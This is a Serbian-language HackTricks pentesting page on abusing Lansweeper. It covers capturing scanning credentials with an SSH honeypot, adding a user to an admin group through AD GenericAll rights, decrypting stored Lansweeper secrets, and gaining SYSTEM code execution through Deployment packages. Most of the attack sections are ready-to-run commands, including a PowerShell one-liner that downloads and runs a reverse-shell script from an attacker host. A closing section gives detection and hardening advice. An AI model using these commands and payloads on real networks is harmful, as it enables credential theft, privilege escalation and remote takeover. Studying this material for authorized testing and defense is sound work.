# Lansweeper Abuse: Prikupljanje kredencijala, dešifrovanje secrets i RCE putem Deployment-a

{{#include ../../banners/hacktricks-training.md}}

Lansweeper je platforma za otkrivanje i inventarizaciju IT asseta koja se često implementira na Windows-u i integriše sa Active Directory-jem. Kredencijali konfigurisani u Lansweeper-u koriste se u njegovim scanning engine-ima za autentifikaciju na assete putem protokola kao što su SSH, SMB/WMI i WinRM. Pogrešne konfiguracije često omogućavaju:

- Presretanje kredencijala preusmeravanjem scanning target-a na host pod kontrolom napadača (honeypot)
- Abuse AD ACL-ova izloženih od strane grupa povezanih sa Lansweeper-om radi dobijanja remote access-a
- Dešifrovanje Lansweeper-configured secrets na hostu (connection strings i sačuvani scanning kredencijali)
- Izvršavanje koda na managed endpoint-ima putem funkcije Deployment (često sa privilegijama SYSTEM)

Ova stranica sažima praktične attacker workflow-e i komande za abuse ovih ponašanja tokom angažmana.

## 1) Prikupljanje scanning kredencijala putem honeypot-a (primer sa SSH-om)

Ideja: kreirati Scanning Target koji pokazuje na vaš host i mapirati postojeće Scanning Credentials na njega. Kada se scan pokrene, Lansweeper će pokušati da se autentifikuje tim kredencijalima, a vaš honeypot će ih uhvatiti.<sup>[[1]](#references)</sup>

Pregled koraka (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (ili Single IP) = vaša VPN IP adresa
- Konfigurisati SSH port na nešto što je dostupno (npr. 2022 ako je 22 blokiran)
- Onemogućiti schedule i planirati ručno pokretanje
- Scanning → Scanning Credentials → proveriti da Linux/SSH kredencijali postoje; mapirati ih na novi target (omogućiti sve po potrebi)
- Kliknuti na “Scan now” na target-u
- Pokrenuti SSH honeypot i preuzeti pokušano korisničko ime/lozinku

Primer sa sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.yaml
server:
listen_address: 0.0.0.0:2022
```

```bash
# Prefer a current release/container; the package in Debian-derived repositories may be stale
sshesame -config sshesame.yaml

# Or run the maintained container image
docker run --rm -it -p 2022:2022 \
-v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Proverite prikupljene kredencijale na DC servisima:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Beleške
- Drugi protokoli nisu ekvivalentni: SMB/WinRM listener obično dobija NTLM challenge-response, a ne lozinku u čistom tekstu. Njeno crackovanje ili relay zavisi od dogovorenih zaštita protokola; pogledajte [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md). SSH password authentication je obično najjednostavniji slučaj sa lozinkom u čistom tekstu.
- SSH public-key authentication serveru otkriva username i fingerprint javnog ključa, **a ne** privatni ključ ili njegovu passphrase. Key-backed credentials preuzmite sa kompromitovanog Lansweeper servera, umesto da očekujete da ih honeypot otkrije.<sup>[[2]](#references)</sup>
- Mnogi skeneri se identifikuju karakterističnim client bannerima (npr. RebexSSH) i pokušavaju bezopasne komande (uname, whoami itd.).

### Redosled izbora credentials je važan

Prilikom ponovnog skeniranja, Lansweeper prvo ponovo pokušava credential koji je poslednji uspeo za taj asset, zatim eksplicitno mapirane credentials prema njihovom konfigurisanom redosledu i na kraju globalni credential istog tipa. Honeypot koji prihvati prvu password authentication zato uobičajeno neće zabeležiti kasnije fallback credentials; tokom ovlašćene procene credential putanje, evidentirajte i odbijte pokušaje ako je cilj provera kompletne fallback sekvence.<sup>[[6]](#references)</sup>

## 2) Zloupotreba AD ACL-ova: steknite remote access dodavanjem sebe u app-admin grupu

Koristite BloodHound za enumeraciju efektivnih prava kompromitovanog accounta. Čest nalaz je scanner- ili app-specific grupa (npr. “Lansweeper Discovery”) koja ima GenericAll nad privilegovanom grupom (npr. “Lansweeper Admins”). Ako je privilegovana grupa takođe član grupe “Remote Management Users”, WinRM postaje dostupan čim sebe dodamo u nju.<sup>[[1]](#references)[[5]](#references)</sup>

Primeri prikupljanja:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Iskoristite GenericAll na grupi pomoću BloodyAD-a (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Zatim pokrenite interaktivni shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Savet: Kerberos operacije zavise od tačnog vremena. Ako naiđete na KRB_AP_ERR_SKEW, prvo sinhronizujte vreme sa DC-om:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Dešifrovanje Lansweeper-configured secrets na hostu

Na Lansweeper serveru, ASP.NET sajt obično čuva enkriptovani connection string i simetrični ključ koji aplikacija koristi. Uz odgovarajući lokalni pristup, možete dešifrovati DB connection string, a zatim izvući sačuvane scanning credentials.<sup>[[1]](#references)</sup>

Uobičajene lokacije:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Koristite SharpLansweeperDecrypt za automatizaciju dešifrovanja i izbacivanje sačuvanih creds. Bez argumenata, trenutni executable dešifruje `web.config`, povezuje se sa bazom podataka i izbacuje sve konfigurisane scanning credentials; `-e` takođe podržava offline/manual dešifrovanje kada su enkriptovana vrednost i key file već dostupni:<sup>[[3]](#references)</sup>
```powershell
# Automatic: use the default web.config and Encryption.txt locations
.\SharpLansweeperDecrypt.exe

# Manual: decrypt one database value with an explicit key file
.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
-p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'

# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
```
Očekivani izlaz uključuje detalje DB konekcije i akreditive za skeniranje u čistom tekstu, kao što su Windows i Linux nalozi koji se koriste širom okruženja. Oni često imaju povišena lokalna prava na hostovima domena:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Koristite oporavljene Windows scanning creds za privilegovani pristup:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Kao član grupe „Lansweeper Admins“, web UI izlaže opcije Deployment i Configuration. U okviru Deployment → Deployment packages možete kreirati pakete koji izvršavaju proizvoljne komande na ciljanim assetima. Lansweeper koristi administrativni scanning credential za pristup Task Scheduler-u i `C$` na targetu, a zatim kreira task za deployment. Kada paket koristi režim pokretanja **System Account**, payload se izvršava kao `NT AUTHORITY\SYSTEM`; drugi režimi pokretanja mogu koristiti mapirani scanning credential ili trenutno prijavljenog korisnika, zato proverite izabrani režim umesto da pretpostavite SYSTEM.<sup>[[1]](#references)[[7]](#references)</sup>

Koraci visokog nivoa:
- Kreirajte novi Deployment package koji izvršava PowerShell ili cmd one-liner (reverse shell, add-user itd.).
- Izaberite željeni asset (npr. DC/host na kojem Lansweeper radi) i kliknite na Deploy/Run now.
- Uhvatite svoj shell kao SYSTEM.

Primeri payload-a (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment akcije su bučne i ostavljaju logove u Lansweeper-u i Windows event logovima. Koristite ih promišljeno.

### Artefakti deployment-a i druga tačka izlaganja credential-a

Scanner upisuje svoj deployment executable u `C:\Windows\LSDeployment` putem `C$`. Package fajlovi se obično čitaju iz `DefaultPackageShare$`, iza kojeg stoji `C:\Program Files (x86)\Lansweeper\PackageShare`, ili iz package share-a specifičnog za IP opseg. Važno je da Lansweeper navodi kako se credential za package share čuva u **reverzibilno enkriptovanom obliku u registry-ju svakog računara koji prima deployment**. Kompromitovani managed endpoint tretirajte kao potencijalnu tačku otkrivanja naloga za taj share i prilikom rekonstrukcije Lansweeper aktivnosti pregledajte deployment direktorijum, istoriju scheduled task-ova i konfigurisane package share-ove.<sup>[[7]](#references)</sup>

## Detekcija i hardening

- Ograničite ili uklonite anonimne SMB enumeracije. Nadgledajte RID cycling i anomalni pristup Lansweeper share-ovima.
- Egress kontrole: blokirajte ili strogo ograničite outbound SSH/SMB/WinRM sa scanner hostova. Upozoravajte na nestandardne portove (npr. 2022) i neuobičajene client bannere poput Rebex-a.
- Zaštitite `Website\\web.config` i `Key\\Encryption.txt`. Premestite secrets u vault i izvršite rotaciju nakon izlaganja. Razmotrite service accounts sa minimalnim privilegijama i gMSA gde je izvodljivo.
- AD monitoring: upozoravajte na promene grupa povezanih sa Lansweeper-om (npr. „Lansweeper Admins“, „Remote Management Users“) i na ACL promene kojima se dodeljuje GenericAll/Write članstvo u privilegovanim grupama.
- Audit-ujte kreiranje/promene/izvršavanje Deployment package-ova i korelišite nove remote scheduled task-ove sa upisima u `C:\Windows\LSDeployment`; upozoravajte na package-ove koji pokreću `cmd.exe`/`powershell.exe` ili neočekivane outbound konekcije.
- Dodelite credential-ima za package share samo dozvolu **Read & Execute** i nikada ih nemojte ponovo koristiti za administraciju. Kada je praktično, dajte prednost agent-based inventarizaciji: ako se svi računari skeniraju putem agenta, a deployment modul se ne koristi, Lansweeper ne zahteva sačuvane credential-e za skeniranje računara.<sup>[[6]](#references)[[7]](#references)</sup>

## Povezane teme
- [SMB/LSA/SAMR enumeracija i RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
- [Kerberos autentikacija i razmatranja u vezi sa odstupanjem sata](kerberos-authentication.md)
- [BloodHound analiza putanja](bloodhound.md)
- [WinRM upotreba i lateralno kretanje](../lateral-movement/winrm.md)



## References
- [1] [HTB: Sweep — Zloupotreba Lansweeper skeniranja, AD ACL-ova i secrets-a za preuzimanje DC-a (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [6] [Kreiranje i mapiranje credential-a za skeniranje — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
- [7] [Zahtevi za deployment — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
{{#include ../../banners/hacktricks-training.md}}
